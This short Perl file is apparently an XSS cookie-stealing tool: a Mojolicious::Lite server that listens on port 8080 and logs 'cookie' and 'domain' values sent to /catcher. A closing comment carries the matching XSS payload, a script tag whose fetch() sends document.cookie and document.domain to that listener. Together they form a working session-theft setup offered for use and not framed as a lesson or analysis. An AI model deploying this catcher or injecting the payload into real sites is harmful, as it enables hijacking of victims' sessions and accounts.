#!/usr/bin/env perl

# perl catcher.pl daemon -m production -l http://*:8080

use 5.010;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get '/catcher' => sub ($catcher) {
	my $cookie = $catcher -> param('cookie');
  	my $domain = $catcher -> param('domain');

	print "Hello from $domain, \t your cookie is $cookie";
};

app -> start();

#<script>fetch("http://localhost:8080/catcher?domain="+document.domain+"&cookie="+document.cookie);</script>